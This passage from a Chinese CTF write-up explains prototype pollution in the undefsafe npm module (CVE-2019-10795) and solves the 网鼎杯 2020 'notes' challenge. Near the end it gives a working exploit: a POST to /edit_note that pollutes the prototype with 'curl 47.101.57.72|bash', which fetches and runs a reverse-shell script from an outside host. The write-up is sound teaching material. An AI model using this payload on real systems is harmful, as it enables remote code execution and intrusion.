    console.log(object)
    // { a: { b: { c: 1, d: [Array], e: '123' } } }
我们可以看到，其可以帮助我们修改对应属性的值。如果当属性不存在时，我们想对该属性赋值：
    var a = require("undefsafe");
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    console.log(object)
    // { a: { b: { c: 1, d: [Array], e: 'skysec' } } }
    a(object,'a.f.e','123')
    console.log(object)
    // { a: { b: { c: 1, d: [Array], e: 'skysec' }, e: '123' } }
访问属性会在上层进行创建并赋值。
### undefsafe 模块漏洞分析
通过以上演示我们可知，undefsafe 是一款支持设置值的函数。但是 undefsafe
模块在小于2.0.3版本，存在原型链污染漏洞（CVE-2019-10795）。
我们在 2.0.3 版本中进行测试：
    var a = require("undefsafe");
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    var payload = "__proto__.toString";
    a(object,payload,"evilstring");
    console.log(object.toString);
    // [Function: toString]
但是如果在低于 2.0.3 版本运行，则会得到如下输出：
    var a = require("undefsafe");
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    var payload = "__proto__.toString";
    a(object,payload,"evilstring");
    console.log(object.toString);
    //evilstring
可见，当 undefsafe() 函数的第 2，3 个参数可控时，我们可以污染 object 对象中的值。
再来看一个简单例子：
    var a = require("undefsafe");
    var test = {}
    console.log('this is '+test)    // 将test对象与字符串'this is '进行拼接
    // this is [object Object]
返回：[object Object]，并与this is进行拼接。但是当我们使用 undefsafe 的时候，可以对原型进行污染：
    a(test,'__proto__.toString',function(){ return 'just a evil!'})
    console.log('this is '+test)    // 将test对象与字符串'this is '进行拼接
    // this is just a evil!
可以看到最终输出了 "this is just a
evil!"。这就是因为原型链污染导致，当我们将对象与字符串拼接时，即将对象当做字符串使用时，会自动其触发 toString
方法。但由于当前对象中没有，则回溯至原型中寻找，并发现toString方法，同时进行调用，而此时原型中的toString方法已被我们污染，因此可以导致其输出被我们污染后的结果。下面我们来看一道
CTF 例题。
### [网鼎杯 2020 青龙组]notes
题目给了源码：
    var express = require('express');
    var path = require('path');
    const undefsafe = require('undefsafe');
    const { exec } = require('child_process');
    var app = express();
    class Notes {
        constructor() {
            this.owner = "whoknows";
            this.num = 0;
            this.note_list = {};    // 定义了一个字典，在后面的攻击过程中会用到
        }
        write_note(author, raw_note) {
            this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
        }
        get_note(id) {
            var r = {}
            undefsafe(r, id, undefsafe(this.note_list, id));
            return r;
        }
        edit_note(id, author, raw) {
            undefsafe(this.note_list, id + '.author', author);
            undefsafe(this.note_list, id + '.raw_note', raw);
        }
        get_all_notes() {
            return this.note_list;
        }
        remove_note(id) {
            delete this.note_list[id];
        }
    }
    var notes = new Notes();
    notes.write_note("nobody", "this is nobody's first note");
    app.set('views', path.join(__dirname, 'views'));
    app.set('view engine', 'pug');    // 设置模板引擎为pug
    app.use(express.json());
    app.use(express.urlencoded({ extended: false }));
    app.use(express.static(path.join(__dirname, 'public')));
    app.get('/', function(req, res, next) {
      res.render('index', { title: 'Notebook' });
    });
    app.route('/add_note')
        .get(function(req, res) {
            res.render('mess', {message: 'please use POST to add a note'});
        })
        .post(function(req, res) {
            let author = req.body.author;
            let raw = req.body.raw;
            if (author && raw) {
                notes.write_note(author, raw);
                res.render('mess', {message: "add note sucess"});
            } else {
                res.render('mess', {message: "did not add note"});
            }
        })
    app.route('/edit_note')    // 该路由中 undefsafe 三个参数均可控
        .get(function(req, res) {
            res.render('mess', {message: "please use POST to edit a note"});
        })
        .post(function(req, res) {
            let id = req.body.id;
            let author = req.body.author;
            let enote = req.body.raw;
            if (id && author && enote) {
                notes.edit_note(id, author, enote);
                res.render('mess', {message: "edit note sucess"});
            } else {
                res.render('mess', {message: "edit note failed"});
            }
        })
    app.route('/delete_note')
        .get(function(req, res) {
            res.render('mess', {message: "please use POST to delete a note"});
        })
        .post(function(req, res) {
            let id = req.body.id;
            if (id) {
                notes.remove_note(id);
                res.render('mess', {message: "delete done"});
            } else {
                res.render('mess', {message: "delete failed"});
            }
        })
    app.route('/notes')
        .get(function(req, res) {
            let q = req.query.q;
            let a_note;
            if (typeof(q) === "undefined") {
                a_note = notes.get_all_notes();
            } else {
                a_note = notes.get_note(q);
            }
            res.render('note', {list: a_note});
        })
    app.route('/status')    // 漏洞点，只要将字典 commands 给污染了, 就能任意执行我们的命令
        .get(function(req, res) {
            let commands = {
                "script-1": "uptime",
                "script-2": "free -m"
            };
            for (let index in commands) {
                exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                    if (err) {
                        return;
                    }
                    console.log(`stdout: ${stdout}`);    // 将命令执行结果输出
                });
            }
            res.send('OK');
            res.end();
        })
    app.use(function(req, res, next) {
      res.status(404).send('Sorry cant find that!');
    });
    app.use(function(err, req, res, next) {
      console.error(err.stack);
      res.status(500).send('Something broke!');
    });
    const port = 8080;
    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
我们注意到其使用了 undefsafe 模块，那么如果我们可以操纵其第 2、3 个参数，即可进行原型链污染，则可使目标网站存在风险。故此，我们首先要寻找
undefsafe 的调用点：
    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }
    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }
发现在查看 note 和编辑 note 时会调用 undefsafe，那我们首先查看 get_note 方法会被哪个路由调用：
    app.route('/notes')
        .get(function(req, res) {
            let q = req.query.q;
            let a_note;
            if (typeof(q) === "undefined") {
                a_note = notes.get_all_notes();
            } else {
                a_note = notes.get_note(q);
            }
            res.render('note', {list: a_note});
        })
发现此时虽然 q 参数可控，但是也只有 q 参数可控，也就是说我们只能控制 undefsave 函数的第二个参数，而 undefsave
函数的第三个参数我们控制不了。
而对于 edit_note 方法，我们发现 edit_note 路由中会调用 edit_note 方法：
    app.route('/edit_note')
        .get(function(req, res) {
            res.render('mess', {message: "please use POST to edit a note"});
        })
        .post(function(req, res) {
            let id = req.body.id;
            let author = req.body.author;
            let enote = req.body.raw;
            if (id && author && enote) {
                notes.edit_note(id, author, enote);
                res.render('mess', {message: "edit note sucess"});
            } else {
                res.render('mess', {message: "edit note failed"});
            }
        })
此时 id、author 和 raw 均为我们的可控值，那么我们则可以操纵原型链进行污染：
    edit_note(id, author, raw) {
            undefsafe(this.note_list, id + '.author', author);
            undefsafe(this.note_list, id + '.raw_note', raw);
        }
那么既然找到了可以进行原型链污染的位置，就要查找何处可以利用污染的值造成攻击，我们依次查看路由，发现 /status 路由有命令执行的操作：
    app.route('/status')    // 漏洞点，只要将字典commands给污染了，就能执行我们的任意命令
        .get(function(req, res) {
            let commands = {
                "script-1": "uptime",
                "script-2": "free -m"
            };
            for (let index in commands) {
                exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                    if (err) {
                        return;
                    }
                    console.log(`stdout: ${stdout}`);    // 将命令执行结果输出
                });
            }
            res.send('OK');
            res.end();
        })
那我们的思路就来了，我们可以通过 /edit_note 路由污染 note_list 对象的原型，比如加入某个命令，由于 commands 和
note_list 都继承自同一个原型，那么在遍历 commands 时便会取到我们污染进去的恶意命令并执行。
在 VPS 上面创建一个反弹 Shell 的文件，然后等待目标主机去 Curl 访问并执行他：
在目标主机执行 Payload：
    POST /edit_note
    id=__proto__.aaa&author=curl 47.101.57.72|bash&raw=lalala;
再访问 /status 路由，利用污染后的结果进行命令执行，成功反弹 Shell 并得到 flag：
## Ending......
> 参考：
>
>  attack.html#0x01-prototype__proto__>
>
>  CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain>
>
> 